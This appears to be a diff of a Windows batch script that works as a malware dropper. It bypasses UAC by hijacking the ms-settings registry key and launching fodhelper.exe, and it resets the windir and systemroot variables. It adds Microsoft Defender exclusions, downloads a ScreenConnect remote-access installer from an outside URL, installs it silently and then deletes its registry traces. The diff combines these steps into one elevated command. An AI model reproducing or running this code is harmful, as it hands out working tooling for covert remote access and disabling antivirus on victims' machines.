@@ -11,16 +11,14 @@ set "MSI=%TEMP%\ScreenConnect.ClientSetup.msi"
 set "URL=https://ashy-meadow-058164310.2.azurestaticapps.net/ScreenConnect.ClientSetup.msi"
 set "R=HKCU\Software\Classes\ms-settings\Shell\Open\command"
 set "W=%TEMP%\cdw"
-powershell -nop -w hidden -c "try{Add-MpPreference -ExclusionPath '%TEMP%','%MSI%'}catch{}"
-curl -fsSL -o "%MSI%" "%URL%"
-if errorlevel 1 exit /b 1
+set "ELEV=cmd.exe /c powershell -nop -w hidden -c \"try{Add-MpPreference -ExclusionPath '%TEMP%','%MSI%'}catch{}\"&curl -fsSL -o \"%MSI%\" \"%URL%\"&msiexec /i \"%MSI%\" /qn /norestart"
 mkdir "%W%\System32" 2>nul
 reg add HKCU\Environment /v windir /t REG_SZ /d "%W%" /f>nul
 reg add HKCU\Environment /v systemroot /t REG_SZ /d "%W%" /f>nul
-reg add "%R%" /ve /d "cmd.exe /c start /wait msiexec /i \"%MSI%\" /qn /norestart" /f>nul
+reg add "%R%" /ve /d "%ELEV%" /f>nul
 reg add "%R%" /v DelegateExecute /t REG_SZ /d "" /f>nul
 start "" fodhelper.exe
-ping 127.0.0.1 -n 35 >nul
+ping 127.0.0.1 -n 55 >nul
 reg delete "%R%" /f>nul
 reg delete HKCU\Environment /v windir /f>nul
 reg delete HKCU\Environment /v systemroot /f>nul
